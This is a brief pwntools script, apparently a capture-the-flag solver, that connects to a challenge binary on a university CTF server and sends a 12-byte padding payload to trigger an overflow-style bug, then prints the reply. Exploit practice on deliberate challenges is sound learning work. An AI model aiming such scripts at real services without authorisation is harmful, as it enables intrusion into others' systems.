from pwn import *
import struct
BINARY = ['./chall']
IP, PORT = 'ctf99.cs.ui.ac.id', 10005
LOCAL = False
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
           
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)

dummy = b'A' * (10 + 2)
payload = dummy
p.sendline(payload)

print(p.recvall().decode())
if LOCAL:
    pause()
